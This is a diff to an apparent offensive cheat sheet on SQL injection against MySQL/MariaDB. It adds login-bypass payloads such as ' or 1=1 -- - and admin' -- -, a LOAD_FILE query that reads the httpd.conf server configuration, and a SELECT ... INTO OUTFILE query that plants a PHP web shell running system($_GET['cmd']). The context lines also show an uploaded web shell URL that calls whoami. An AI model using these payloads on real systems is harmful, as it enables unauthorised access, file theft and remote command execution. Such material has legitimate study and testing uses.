@@ -794,6 +794,14 @@ https://site.com/upload/ok.jpg.php?ok=whoami
 
 ## SQL Injection
 ### SQL Injection - MySQL/MariaDB
+-> Bypass Authentication  
+```
+' or 1=1 -- -
+admin' -- -
+' or 1=1 order by 2 -- -
+' or 1=1 order by 1 desc -- - 
+' or 1=1 limit 1,1 -- -
+```
 -> get number columns
 ```
 -1 order by 3;#
@@ -825,8 +833,12 @@ https://site.com/upload/ok.jpg.php?ok=whoami
 ```
 
 #### Webshell via SQLI - MySQL
+-> view web server path  
 ```
 LOAD_FILE('/etc/httpd/conf/httpd.conf')    
+```
+-> creating webshell
+```
 select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php";
 ```
 
